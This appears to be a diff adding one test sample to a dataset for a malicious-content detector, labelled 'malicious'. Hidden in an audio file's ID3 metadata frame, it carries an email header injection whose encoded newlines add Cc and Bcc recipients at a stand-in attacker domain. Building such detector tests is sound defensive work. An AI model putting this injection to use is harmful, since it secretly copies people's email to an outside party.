@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::128::binary-variations::0",
+  "base_sample_id": "exp::email-webfetch::128",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -1806257378,
+  "content": "{\n  \"format\": \"audio\",\n  \"id3\": {\n    \"version\": \"2.4.0\",\n    \"frames\": {\n      \"TXXX\": {\n        \"description\": \"UserDefined\",\n        \"value\": \"To: victim@target.example.com%0ACc:spy@evil.example.com%0ABcc:spy2@evil.example.com\\n\"\n      },\n      \"TPE1\": {\n        \"description\": \"Artist\",\n        \"value\": \"Unknown Artist\"\n      }\n    }\n  }\n}",
+  "content_hash": "1d85c27027e2c481e9c72d1c12d75991381fe403e1019a3deb4c855395d7ef40",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:id3",
+  "difficulty": "advanced"
+}
